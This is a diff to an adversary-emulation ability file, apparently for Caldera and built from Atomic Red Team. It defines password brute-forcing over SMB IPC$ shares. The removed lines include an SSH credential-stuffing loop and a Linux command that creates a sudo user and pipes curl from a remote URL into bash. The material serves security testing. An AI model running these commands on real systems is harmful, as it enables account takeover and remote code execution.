@@ -1,26 +1,29 @@
 - id: f82df574-c9f4-4e19-8d1a-311ad92883fd
-  name: Brute Force
-  description: Ability for Brute Force (ATT&CK T1110). Generated from Atomic Red Team
-    procedures; review and test safely before use.
+  name: Brute Force Credentials of single Active Directory domain users via SMB (Generated from Atomic Red Team)
+  description: |
+    Ability for Brute Force: Password Guessing (ATT&CK T1110.001).
+    Attempts to brute force a single Active Directory account by testing connectivity to the IPC$ share on a remote machine
+    Generated from Atomic Red Team procedures (09480053-2f98-4854-be6e-71ae5f672224); review and test safely before use.
   tactic: credential-access
   technique:
-    attack_id: T1110
-    name: Brute Force
+    attack_id: T1110.001
+    name: 'Brute Force: Password Guessing'
   platforms:
     windows:
       psh:
-        command: 'echo Password1> passwords.txt echo 1q2w3e4r>> passwords.txt echo
-          Password!>> passwords.txt echo Spring2022>> passwords.txt echo ChangeMe!>>
-          passwords.txt @FOR /F "delims=" %p in (passwords.txt) DO @net use %logonserver%\IPC$
-          /user:"%userdomain%\#{user}" "%p" 1>NUL 2>&1 && @echo [*] #{user}:%p &&
-          @net use /delete %logonserver%\IPC$ > NUL'
-    linux:
-      sh:
-        command: 'useradd -G sudo -s /bin/bash -p $(openssl passwd -1 password123)
-          art su -c "cd /tmp; curl -s #{remote_url} | bash" art'
-    darwin:
-      sh:
-        command: cp "$#{atomics_dir}/T1110.004/src/credstuffuserpass.txt" /tmp/ for
-          unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass
-          | cut -d":" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut
-          -d":" -f1`@#{target_host};done
+        command: |
+          echo Password1 > passwords.txt;
+          echo 1q2w3e4r >> passwords.txt;
+          echo Password! >> passwords.txt;
+          echo Spring2022 >> passwords.txt;
+          echo ChangeMe! >> passwords.txt;
+          foreach($passw in Get-Content ".\passwords.txt") {
+            net use '\\#{remote.host.fqdn}\IPC$' /user:"$env:USERDNSDOMAIN\$env:USERNAME" "$passw" 1>$null 2>&1;
+            if ($?) {
+              echo [*] "$env:USERNAME : $passw";
+              net use /delete '\\#{remote.host.fqdn}\IPC$';
+              break;
+            }
+          }
+        cleanup: |
+          rm passwords.txt -force
